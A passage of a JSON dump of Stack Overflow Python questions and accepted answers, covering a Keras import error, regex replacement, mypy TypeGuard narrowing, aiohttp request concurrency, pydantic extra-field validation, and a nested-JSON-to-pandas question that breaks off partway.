    "Body": "I am trying to run an image-based project on colab. I found the project on github. Everything runs fine till I reached the cell with the following code:\nimport keras\nfrom keras.preprocessing.image import ImageDataGenerator\nfrom keras.applications.resnet50 import preprocess_input, ResNet50\nfrom keras.models import Model\nfrom keras.layers import Dense, MaxPool2D, Conv2D\n\nWhen I run it, the following output is observed:\n---------------------------------------------------------------------------\nModuleNotFoundError                       Traceback (most recent call last)\n in ()\n      1 import keras\n      2 from keras.preprocessing.image import ImageDataGenerator\n----> 3 from keras.applications.resnet50 import preprocess_input, ResNet50\n      4 from keras.models import Model\n      5 from keras.layers import Dense, MaxPool2D, Conv2D\n\nModuleNotFoundError: No module named 'keras.applications.resnet50'\n\n---------------------------------------------------------------------------\n\nIt's running 2.7.0 keras, connected to a TPU runtime. I tried !pip installing the said module but no use. I even tried running a demo resnet50 project too but got the same error. Can anyone please help me solve the error?\n",
    "AcceptedAnswerId": 71117585,
    "AcceptedAnswer": "from tensorflow.keras.applications.resnet50 import ResNet50\n\n"
}
{
    "Id": 71297077,
    "PostTypeId": 1,
    "Title": "Python regex replace every 2nd occurrence in a string",
    "Body": "I have a string with data that looks like this:\nstr1 = \"[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]\"\n\nI would want to replace every second iteration of \"],[\" with \",\" so it will look like this:\nstr2 = \"[2.4,5],[2.54,4],[3.36,4.46],[3.36,4],[3.63,4.86],[4,4.63]\"\n\nHere is was I have so far:\nstr1 = \"[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]\"\ns2 = re.sub(r\"],\\[\", ',', str1)\nprint(s2)\n\nI was trying to mess around with this:\n(.*?],\\[){2}\n\nBut it does not seem to yield me the desired results.\nI tried using loops but I only managed to replace only the second occurrence and nothing after using this sample code I found here. And the code is:\nimport re\n\ndef replacenth(string, sub, wanted, n):\n    where = [m.start() for m in re.finditer(sub, string)][n-1]\n    before = string[:where]\n    after = string[where:]\n    after = after.replace(sub, wanted, 1)\n    newString = before + after\n    print(newString)\nFor these variables:\n\nstring = 'ababababababababab'\nsub = 'ab'\nwanted = 'CD'\nn = 5\n\nThank you.\n",
    "AcceptedAnswerId": 71297176,
    "AcceptedAnswer": "You can use\nimport re\nfrom itertools import count\n\nstr1 = \"[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]\"\nc = count(0)\nprint( re.sub(r\"],\\[\", lambda x: \",\" if next(c) % 2 == 0 else x.group(), str1) )\n# => [2.4,5],[2.54,4],[3.36,4.46],[3.36,4],[3.63,4.86],[4,4.63]\n\nSee the Python demo.\nThe regex is the same, ],\\[, it matches a literal ],[ text.\nThe c = count(0)  initializes the counter whose value is incremented upon each match inside a lambda expression used as the replacement argument. When the  counter is even, the match is replaced with a comma, else, it is kept as is.\n"
}
{
    "Id": 71805426,
    "PostTypeId": 1,
    "Title": "how to tell a python type checker that an optional definitely exists?",
    "Body": "I'm used to typescript, in which one can use a ! to tell the type-checker to assume a value won't be null. Is there something analogous when using type annotations in python?\nA (contrived) example:\nWhen executing the expression m.maybe_num + 3 in the code below, the enclosing if guarantees that maybe_num won't be None.  But the type-checker doesn't know that, and returns an error.  (Verified in https://mypy-play.net/?mypy=latest&python=3.10.) How can I tell the type-checker that I know better?\nfrom typing import Optional\n\nclass MyClass:\n\n    def __init__(self, maybe_num: Optional[int]):\n        self.maybe_num = maybe_num\n        \n    def has_a_num(self) -> bool:\n        return self.maybe_num is not None\n\n    def three_more(self) -> Optional[int]:\n        if self.has_a_num:\n            # mypy error: Unsupported operand types for + (\"None\" and \"int\")\n            return self.maybe_num + 3\n        else:\n            return None\n\n",
    "AcceptedAnswerId": 71806921,
    "AcceptedAnswer": "Sadly there's no clean way to infer the type of something from a function call like this, but you can work some magic with TypeGuard annotations for the has_a_num() method, although the benefit from those annotations won't really be felt unless the difference is significantly more major than the type of a single int. If it's just a single value, you should just use a standard  is not None check.\nif self.maybe_num is not None:\n    ...\n\nYou can define a subclass of your primary subclass, where the types of any parameters whose types are affected are explicitly redeclared.\nclass MyIntClass(MyClass):\n    maybe_num: int\n\nFrom there, your checker function should still return a boolean, but the annotated return type tells MyPy that it should use it for type narrowing to the listed type.\nSadly it will only do this for proper function parameters, rather than the implicit self argument, but this can be fixed easily enough by providing self explicitly as follows:\nif MyClass.has_a_num(self):\n    ...\n\nThat syntax is yucky, but it works with MyPy.\nThis makes the full solution be as follows\n# Parse type annotations as strings to avoid \n# circular class references\nfrom __future__ import annotations\nfrom typing import Optional, TypeGuard\n\nclass MyClass:\n    def __init__(self, maybe_num: Optional[int]):\n        self.maybe_num = maybe_num\n\n    def has_a_num(self) -> TypeGuard[_MyClass_Int]:\n        # This annotation defines a type-narrowing operation,\n        # such that if the return value is True, then self\n        # is (from MyPy's perspective) _MyClass_Int, and \n        # otherwise it isn't\n        return self.maybe_num is not None\n\n    def three_more(self) -> Optional[int]:\n        if MyClass.has_a_num(self):\n            # No more mypy error\n            return self.maybe_num + 3\n        else:\n            return None\n\nclass _MyClass_Int(MyClass):\n    maybe_num: int\n\nTypeGuard was added in Python 3.10, but can be used in earlier versions using the typing_extensions module from pip.\n"
}
{
    "Id": 71232879,
    "PostTypeId": 1,
    "Title": "How to speed up async requests in Python",
    "Body": "I want to download/scrape 50 million log records from a site. Instead of downloading 50 million in one go, I was trying to download it in parts like 10 million at a time using the following code but it's only handling 20,000 at a time (more than that throws an error) so it becomes time-consuming to download that much data. Currently, it takes 3-4 mins to download 20,000 records with the speed of 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 20000/20000 [03:48 so how to speed it up?\nimport asyncio\nimport aiohttp\nimport time\nimport tqdm\nimport nest_asyncio\n\nnest_asyncio.apply()\n\n\nasync def make_numbers(numbers, _numbers):\n    for i in range(numbers, _numbers):\n        yield i\n\n\nn = 0\nq = 10000000\n\n\nasync def fetch():\n    # example\n    url = \"https://httpbin.org/anything/log?id=\"\n\n    async with aiohttp.ClientSession() as session:\n        post_tasks = []\n        # prepare the coroutines that poat\n        async for x in make_numbers(n, q):\n            post_tasks.append(do_get(session, url, x))\n        # now execute them all at once\n\n        responses = [await f for f in tqdm.tqdm(asyncio.as_completed(post_tasks), total=len(post_tasks))]\n\n\nasync def do_get(session, url, x):\n    headers = {\n        'Content-Type': \"application/x-www-form-urlencoded\",\n        'Access-Control-Allow-Origin': \"*\",\n        'Accept-Encoding': \"gzip, deflate\",\n        'Accept-Language': \"en-US\"\n    }\n\n    async with session.get(url + str(x), headers=headers) as response:\n        data = await response.text()\n        print(data)\n\n\ns = time.perf_counter()\ntry:\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(fetch())\nexcept:\n    print(\"error\")\n\nelapsed = time.perf_counter() - s\n# print(f\"{__file__} executed in {elapsed:0.2f} seconds.\")\n\nTraceback (most recent call last):\nFile \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 986, in _wrap_create_connection\n    return await self._loop.create_connection(*args, **kwargs)  # type: ignore[return-value]  # noqa\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\base_events.py\", line 1056, in create_connection\n    raise exceptions[0]\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\base_events.py\", line 1041, in create_connection\n    sock = await self._connect_sock(\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\base_events.py\", line 955, in _connect_sock\n    await self.sock_connect(sock, address)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\proactor_events.py\", line 702, in sock_connect\n    return await self._proactor.connect(sock, address)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\tasks.py\", line 328, in __wakeup\n    future.result()\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\windows_events.py\", line 812, in _poll\n    value = callback(transferred, key, ov)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\windows_events.py\", line 599, in finish_connect\n    ov.getresult()\nOSError: [WinError 121] The semaphore timeout period has expired\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File \"C:\\Users\\SGM\\Desktop\\xnet\\x3stackoverflow.py\", line 136, in \n    loop.run_until_complete(fetch())\n  File \"C:\\Users\\SGM\\AppData\\Roaming\\Python\\Python39\\site-packages\\nest_asyncio.py\", line 81, in run_until_complete\n    return f.result()\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\futures.py\", line 201, in result\n    raise self._exception\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\tasks.py\", line 256, in __step\n    result = coro.send(None)\n  File \"C:\\Users\\SGM\\Desktop\\xnet\\x3stackoverflow.py\", line 88, in fetch\n    response = await f\n  File \"C:\\Users\\SGM\\Desktop\\xnet\\x3stackoverflow.py\", line 37, in _wait_for_one\n    return f.result()\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\futures.py\", line 201, in result\n    raise self._exception\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\asyncio\\tasks.py\", line 258, in __step\n    result = coro.throw(exc)\n  File \"C:\\Users\\SGM\\Desktop\\xnet\\x3stackoverflow.py\", line 125, in do_get\n    async with session.get(url + str(x), headers=headers) as response:\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\client.py\", line 1138, in __aenter__\n    self._resp = await self._coro\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\client.py\", line 535, in _request\n    conn = await self._connector.connect(\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 542, in connect\n    proto = await self._create_connection(req, traces, timeout)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 907, in _create_connection\n    _, proto = await self._create_direct_connection(req, traces, timeout)\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 1206, in _create_direct_connection\n    raise last_exc\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 1175, in _create_direct_connection\n    transp, proto = await self._wrap_create_connection(\n  File \"C:\\Users\\SGM\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\aiohttp\\connector.py\", line 992, in _wrap_create_connection\n    raise client_error(req.connection_key, exc) from exc\naiohttp.client_exceptions.ClientConnectorError: Cannot connect to host example.com:80 ssl:default [The semaphore timeout period has expired]\n\n",
    "AcceptedAnswerId": 71285322,
    "AcceptedAnswer": "Bottleneck: number of simultaneous connections\nFirst, the bottleneck is the total number of simultaneous connections in the TCP connector.\nThat default for aiohttp.TCPConnector is limit=100. On most systems (tested on macOS), you should be able to double that by passing a connector with limit=200:\n# async with aiohttp.ClientSession() as session:\nasync with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200)) as session:\n\nThe time taken should decrease significantly. (On macOS: q = 20_000 decreased 43% from 58 seconds to 33 seconds, and q = 10_000 decreased 42% from 31 to 18 seconds.)\nThe limit you can configure depends on the number of file descriptors that your machine can open. (On macOS: You can run ulimit -n to check, and ulimit -n 1024 to increase to 1024 for the current terminal session, and then change to limit=1000. Compared to limit=100, q = 20_000 decreased 76% to 14 seconds, and q = 10_000 decreased 71% to 9 seconds.)\nSupporting 50 million requests: async generators\nNext, the reason why 50 million requests appears to hang is simply because of its sheer number.\nJust creating 10 million coroutines in post_tasks takes 68-98 seconds (varies greatly on my machine), and then the event loop is further burdened with that many tasks, 99.99% of which are blocked by the TCP connection pool.\nWe can defer the creation of coroutines using an async generator:\nasync def make_async_gen(f, n, q):\n    async for x in make_numbers(n, q):\n        yield f(x)\n\nWe need a counterpart to asyncio.as_completed() to handle async_gen and concurrency:\nfrom asyncio import ensure_future, events\nfrom asyncio.queues import Queue\n\ndef as_completed_for_async_gen(fs_async_gen, concurrency):\n    done = Queue()\n    loop = events.get_event_loop()\n    # todo = {ensure_future(f, loop=loop) for f in set(fs)}  # -\n    todo = set()                                             # +\n\n    def _on_completion(f):\n        todo.remove(f)\n        done.put_nowait(f)\n        loop.create_task(_add_next())  # +\n\n    async def _wait_for_one():\n        f = await done.get()\n        return f.result()\n\n    async def _add_next():  # +\n        try:\n            f = await fs_async_gen.__anext__()\n        except StopAsyncIteration:\n            return\n        f = ensure_future(f, loop=loop)\n        f.add_done_callback(_on_completion)\n        todo.add(f)\n\n    # for f in todo:                           # -\n    #     f.add_done_callback(_on_completion)  # -\n    # for _ in range(len(todo)):               # -\n    #     yield _wait_for_one()                # -\n    for _ in range(concurrency):               # +\n        loop.run_until_complete(_add_next())   # +\n    while todo:                                # +\n        yield _wait_for_one()                  # +\n\nThen, we update fetch():\nfrom functools import partial\n\nCONCURRENCY = 200  # +\n\nn = 0\nq = 50_000_000\n\nasync def fetch():\n    # example\n    url = \"https://httpbin.org/anything/log?id=\"\n\n    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=CONCURRENCY)) as session:\n        # post_tasks = []                                                # -\n        # # prepare the coroutines that post                             # -\n        # async for x in make_numbers(n, q):                             # -\n        #     post_tasks.append(do_get(session, url, x))                 # -\n        # Prepare the coroutines generator                               # +\n        async_gen = make_async_gen(partial(do_get, session, url), n, q)  # +\n\n        # now execute them all at once                                                                         # -\n        # responses = [await f for f in tqdm.asyncio.tqdm.as_completed(post_tasks, total=len(post_tasks))]     # -\n        # Now execute them with a specified concurrency                                                        # +\n        responses = [await f for f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q)]  # +\n\nOther limitations\nWith the above, the program can start processing 50 million requests but:\n\nit will still take 8 hours or so with CONCURRENCY = 1000, based on the estimate from tqdm.\nyour program may run out of memory for responses and crash.\n\nFor point 2, you should probably do:\n# responses = [await f for f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q)]\nfor f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q):\n    response = await f\n    \n    # Do something with response, such as writing to a local file\n    # ...\n\n\nAn error in the code\ndo_get() should return data:\nasync def do_get(session, url, x):\n    headers = {\n        'Content-Type': \"application/x-www-form-urlencoded\",\n        'Access-Control-Allow-Origin': \"*\",\n        'Accept-Encoding': \"gzip, deflate\",\n        'Accept-Language': \"en-US\"\n    }\n\n    async with session.get(url + str(x), headers=headers) as response:\n        data = await response.text()\n        # print(data)  # -\n        return data    # +\n\n"
}
{
    "Id": 71837398,
    "PostTypeId": 1,
    "Title": "Pydantic validations for extra fields that not defined in schema",
    "Body": "I am using pydantic for schema validations and I would like to throw an error when any extra field is added to a schema that isn't defined.\nfrom typing import Literal, Union\n\nfrom pydantic import BaseModel, Field, ValidationError\n\n\nclass Cat(BaseModel):\n    pet_type: Literal['cat']\n    meows: int\n\n\nclass Dog(BaseModel):\n    pet_type: Literal['dog']\n    barks: float\n\n\nclass Lizard(BaseModel):\n    pet_type: Literal['reptile', 'lizard']\n    scales: bool\n\n\nclass Model(BaseModel):\n    pet: Union[Cat, Dog, Lizard] = Field(..., discriminator='pet_type')\n    n: int\n\n\nprint(Model(pet={'pet_type': 'dog', 'barks': 3.14, 'eats': 'biscuit'}, n=1))\n\"\"\" try:\n    Model(pet={'pet_type': 'dog'}, n=1)\nexcept ValidationError as e:\n    print(e) \"\"\"\n\n\nIn the above code, I have added the eats field which is not defined. The pydantic validations are applied and the extra values that I defined are removed in response. I wanna throw an error saying eats is not allowed for Dog or something like that. Is there any way to achieve that?\nAnd is there any chance that we can provide the input directly instead of the pet object?\nprint(Model({'pet_type': 'dog', 'barks': 3.14, 'eats': 'biscuit', n=1})). I tried without descriminator but those specific validations are missing related to pet_type. Can someone guide me how to achive either one of that?\n",
    "AcceptedAnswerId": 71838453,
    "AcceptedAnswer": "You can use the extra field in the Config class to forbid extra attributes during model initialisation (by default, additional attributes will be ignored).\nFor example:\nfrom pydantic import BaseModel, Extra\n\nclass Pet(BaseModel):\n    name: str\n\n    class Config:\n        extra = Extra.forbid\n\ndata = {\n    \"name\": \"some name\",\n    \"some_extra_field\": \"some value\",\n}\n\nmy_pet = Pet.parse_obj(data)   # <- effectively the same as Pet(**pet_data)\n\nwill raise a VaidationError:\nValidationError: 1 validation error for Pet\nsome_extra_field\n  extra fields not permitted (type=value_error.extra)\n\nWorks as well when the model is \"nested\", e.g.:\nclass PetModel(BaseModel):\n    my_pet: Pet\n    n: int\n\npet_data = {\n    \"my_pet\": {\"name\": \"Some Name\", \"invalid_field\": \"some value\"},\n    \"n\": 5,\n}\n\npet_model = PetModel.parse_obj(pet_data)\n# Effectively the same as\n# pet_model = PetModel(my_pet={\"name\": \"Some Name\", \"invalid_field\": \"some value\"}, n=5)\n\nwill raise:\nValidationError: 1 validation error for PetModel\nmy_pet -> invalid_field\n  extra fields not permitted (type=value_error.extra)\n\n"
}
{
    "Id": 71104848,
    "PostTypeId": 1,
    "Title": "Mapping complex JSON to Pandas Dataframe",
    "Body": "BackgroundI have a complex nested JSON object, which I am trying to unpack into a pandas df in a very specific way.\nJSON Objectthis is an extract, containing randomized data of the JSON object, which shows examples of the hierarchy (inc. children) for 1x family (i.e. 'Falconer Family'), however there is 100s of them in total and this extract just has 1x family, however the full JSON object has multiple -\n{\n    \"meta\": {\n        \"columns\": [{\n                \"key\": \"value\",\n                \"display_name\": \"Adjusted Value (No Div, USD)\",\n                \"output_type\": \"Number\",\n                \"currency\": \"USD\"\n            },\n            {\n                \"key\": \"time_weighted_return\",\n                \"display_name\": \"Current Quarter TWR (USD)\",\n                \"output_type\": \"Percent\",\n                \"currency\": \"USD\"\n            },\n            {\n                \"key\": \"time_weighted_return_2\",\n                \"display_name\": \"YTD TWR (USD)\",\n                \"output_type\": \"Percent\",\n                \"currency\": \"USD\"\n            },\n            {\n                \"key\": \"_custom_twr_audit_note_911328\",\n                \"display_name\": \"TWR Audit Note\",\n                \"output_type\": \"Word\"\n            }\n        ],\n        \"groupings\": [{\n                \"key\": \"_custom_name_747205\",\n                \"display_name\": \"* Reporting Client Name\"\n            },\n            {\n                \"key\": \"_custom_new_entity_group_453577\",\n                \"display_name\": \"NEW Entity Group\"\n            },\n            {\n                \"key\": \"_custom_level_2_624287\",\n                \"display_name\": \"* Level 2\"\n            },\n            {\n                \"key\": \"legal_entity\",\n                \"display_name\": \"Legal Entity\"\n            }\n        ]\n    },\n    \"data\": {\n        \"type\": \"portfolio_views\",\n        \"attributes\": {\n            \"total\": {\n                \"name\": \"Total\",\n                \"columns\": {\n                    \"time_weighted_return\": -0.046732301295604683,\n                    \"time_weighted_return_2\": -0.046732301295604683,\n                    \"_custom_twr_audit_note_911328\": null,\n                    \"value\": 23132492.905107163\n                },\n                \"children\": [{\n                    \"name\": \"Falconer Family\",\n                    \"grouping\": \"_custom_name_747205\",\n                    \"columns\": {\n                        \"time_weighted_return\": -0.046732301295604683,\n                        \"time_weighted_return_2\": -0.046732301295604683,\n                        \"_custom_twr_audit_note_911328\": null,\n                        \"value\": 23132492.905107163\n                    },\n                    \"children\": [{\n                            \"name\": \"Wealth Bucket A\",\n                            \"grouping\": \"_custom_new_entity_group_453577\",\n                            \"columns\": {\n                                \"time_weighted_return\": -0.045960317420568164,\n                                \"time_weighted_return_2\": -0.045960317420568164,\n                                \"_custom_twr_audit_note_911328\": null,\n                                \"value\": 13264448.506587159\n                            },\n                            \"children\": [{\n                                    \"name\": \"Asset Class A\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": 0.000003434094574039648,\n                                        \"time_weighted_return_2\": 0.000003434094574039648,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 3337.99\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HUDJ Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": 0.000003434094574039648,\n                                            \"time_weighted_return_2\": 0.000003434094574039648,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 3337.99\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class B\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.025871339096964152,\n                                        \"time_weighted_return_2\": -0.025871339096964152,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 1017004.7192636987\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HUDG Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.025871339096964152,\n                                            \"time_weighted_return_2\": -0.025871339096964152,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 1017004.7192636987\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class C\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.030370376329670656,\n                                        \"time_weighted_return_2\": -0.030370376329670656,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 231142.67772000004\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HKDJ Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.030370376329670656,\n                                            \"time_weighted_return_2\": -0.030370376329670656,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 231142.67772000004\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class D\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.05382756475465478,\n                                        \"time_weighted_return_2\": -0.05382756475465478,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 9791282.570000006\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HUDW Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.05382756475465478,\n                                            \"time_weighted_return_2\": -0.05382756475465478,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 9791282.570000006\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class E\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.01351630404081805,\n                                        \"time_weighted_return_2\": -0.01351630404081805,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 2153366.6396034593\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HJDJ Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.01351630404081805,\n                                            \"time_weighted_return_2\": -0.01351630404081805,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 2153366.6396034593\n                                        },\n                                        \"children\": []\n                                    }]\n                                },\n                                {\n                                    \"name\": \"Asset Class F\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.002298190175237247,\n                                        \"time_weighted_return_2\": -0.002298190175237247,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 68313.90999999999\n                                    },\n                                    \"children\": [{\n                                        \"entity_id\": 10604454,\n                                        \"name\": \"HADJ Trust\",\n                                        \"grouping\": \"legal_entity\",\n                                        \"columns\": {\n                                            \"time_weighted_return\": -0.002298190175237247,\n                                            \"time_weighted_return_2\": -0.002298190175237247,\n                                            \"_custom_twr_audit_note_911328\": null,\n                                            \"value\": 68313.90999999999\n                                        },\n                                        \"children\": []\n                                    }]\n                                }\n                            ]\n                        },\n                        {\n                            \"name\": \"Wealth Bucket B\",\n                            \"grouping\": \"_custom_new_entity_group_453577\",\n                            \"columns\": {\n                                \"time_weighted_return\": -0.04769870075659244,\n                                \"time_weighted_return_2\": -0.04769870075659244,\n                                \"_custom_twr_audit_note_911328\": null,\n                                \"value\": 9868044.398519998\n                            },\n                            \"children\": [{\n                                    \"name\": \"Asset Class A\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": 0.000028632718065191298,\n                                        \"time_weighted_return_2\": 0.000028632718065191298,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 10234.94\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.0000282679297198829,\n                                                \"time_weighted_return_2\": 0.0000282679297198829,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 244.28\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.000049373572795108345,\n                                                \"time_weighted_return_2\": 0.000049373572795108345,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 5081.08\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598341,\n                                            \"name\": \"Cht 11th Tr HBO Shirley\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.000006609603754315074,\n                                                \"time_weighted_return_2\": 0.000006609603754315074,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 1523.62\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598337,\n                                            \"name\": \"Cht 11th Tr HBO Hannah\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.000010999769004760296,\n                                                \"time_weighted_return_2\": 0.000010999769004760296,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 1828.9\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598334,\n                                            \"name\": \"Cht 11th Tr HBO Lau\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": 0.000006466673995619843,\n                                                \"time_weighted_return_2\": 0.000006466673995619843,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 1557.06\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class B\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.024645947842438676,\n                                        \"time_weighted_return_2\": -0.024645947842438676,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 674052.31962\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.043304004172576405,\n                                                \"time_weighted_return_2\": -0.043304004172576405,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 52800.96\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.022408434778798836,\n                                                \"time_weighted_return_2\": -0.022408434778798836,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 599594.11962\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598341,\n                                            \"name\": \"Cht 11th Tr HBO Shirley\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.039799855483646174,\n                                                \"time_weighted_return_2\": -0.039799855483646174,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 7219.08\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598337,\n                                            \"name\": \"Cht 11th Tr HBO Hannah\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.039799855483646174,\n                                                \"time_weighted_return_2\": -0.039799855483646174,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 7219.08\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598334,\n                                            \"name\": \"Cht 11th Tr HBO Lau\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.039799855483646174,\n                                                \"time_weighted_return_2\": -0.039799855483646174,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 7219.08\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class C\",\n                                    \"grouping\": 